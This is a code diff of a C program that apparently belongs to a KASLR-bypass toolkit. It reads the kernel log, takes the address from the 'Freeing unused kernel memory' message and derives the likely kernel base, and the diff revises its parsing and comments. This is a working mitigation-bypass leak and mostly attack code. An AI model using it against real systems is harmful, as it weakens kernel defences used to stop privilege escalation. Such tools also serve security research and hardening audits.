@@ -2,41 +2,33 @@
 //
 // free_reserved_area() dmesg KASLR bypass for SMP kernels.
 //
+// x86:
+// [    0.985903] Freeing unused kernel memory: 872K (c19b4000 - c1a8e000)
+// x86_64:
+// [    0.872873] Freeing unused kernel memory: 1476K (ffffffff81f41000 - ffffffff820b2000)
+//
 // Requires:
 // - kernel.dmesg_restrict = 0 (Default on Ubuntu systems);
 //   or CAP_SYSLOG capabilities.
 //
-// https://web.archive.org/web/20171029060939/http://www.blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/
-//
-// free_reserved_area() leak was patched in 2016:
-// https://lore.kernel.org/patchwork/patch/728905/
+// free_reserved_area() leak was removed in kernel v4.10-rc1 on 2016-10-26:
+// https://github.com/torvalds/linux/commit/adb1fe9ae2ee6ef6bc10f3d5a588020e7664dfa7
 //
 // Mostly taken from original code by xairy:
 // https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c
+//
+// References:
+// https://web.archive.org/web/20171029060939/http://www.blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/
 
 #define _GNU_SOURCE
-
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/klog.h>
 #include <sys/mman.h>
-#include <sys/utsname.h>
 #include <unistd.h>
-
-// https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt
-unsigned long KERNEL_BASE_MIN = 0xffffffff80000000ul;
-unsigned long KERNEL_BASE_MAX = 0xffffffffff000000ul;
-
-struct utsname get_kernel_version() {
-  struct utsname u;
-  if (uname(&u) != 0) {
-    printf("[-] uname(): %m\n");
-    exit(1);
-  }
-  return u;
-}
+#include "kasld.h"
 
 #define SYSLOG_ACTION_READ_ALL 3
 #define SYSLOG_ACTION_SIZE_BUFFER 10
@@ -64,31 +56,29 @@ int mmap_syslog(char **buffer, int *size) {
 unsigned long get_kernel_addr_free_reserved_area_dmesg() {
   char *syslog;
   int size;
+  const int addr_len = sizeof(long*) * 2;
+  unsigned long addr = 0;
+
+  printf("[.] checking dmesg for free_reserved_area() info ...\n");
 
   if (mmap_syslog(&syslog, &size))
     return 0;
 
-  const char *needle1 = "Freeing unused";
+  const char *needle1 = "Freeing unused kernel memory";
   char *substr = (char *)memmem(&syslog[0], size, needle1, strlen(needle1));
   if (substr == NULL)
     return 0;
 
-  int start = 0;
-  int end = 0;
-  for (start = 0; substr[start] != '-'; start++)
-    ;
-  for (end = start; substr[end] != '\n'; end++)
-    ;
-
-  const char *needle2 = "ffffff";
-  substr =
-      (char *)memmem(&substr[start], end - start, needle2, strlen(needle2));
-
-  if (substr == NULL)
+  char *line_buf = strtok(substr, "\n");
+  if (line_buf == NULL)
     return 0;
 
-  char *endptr = &substr[16];
-  unsigned long addr = strtoul(&substr[0], &endptr, 16);
+  char *addr_buf = strstr(line_buf, "(");
+  if (addr_buf == NULL)
+    return 0;
+
+  char *endptr = &addr_buf[addr_len];
+  addr = strtoul(&addr_buf[1], &endptr, 16);
 
   if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
     return addr;
@@ -97,28 +87,17 @@ unsigned long get_kernel_addr_free_reserved_area_dmesg() {
 }
 
 int main(int argc, char **argv) {
-  printf("[.] checking dmesg for free_reserved_area() info ...\n");
-
-  struct utsname u = get_kernel_version();
-
-  /* this technique should also work on 32-bit. lazy */
-  if (strstr(u.machine, "64") == NULL) {
-    printf("[-] unsupported: system is not 64-bit.\n");
-    exit(1);
-  }
-
   unsigned long addr = get_kernel_addr_free_reserved_area_dmesg();
   if (!addr)
     return 1;
 
-  printf("leaked address: %lx\n", addr);
+  printf("leaked __init_begin: %lx\n", addr);
 
-  /* ubuntu trusty */
-  printf("kernel base (likely): %lx\n", addr & 0xffffffffff000000ul);
-
-  /* ubuntu xenial */
-  printf("kernel base (likely): %lx\n",
+#if defined(__x86_64__) || defined(__amd64__)
+  printf("kernel base (ubuntu trusty): %lx\n", addr & 0xffffffffff000000ul);
+  printf("kernel base (ubuntu xenial): %lx\n",
          (addr & 0xfffffffffff00000ul) - 0x1000000ul);
+#endif
 
   return 0;
 }
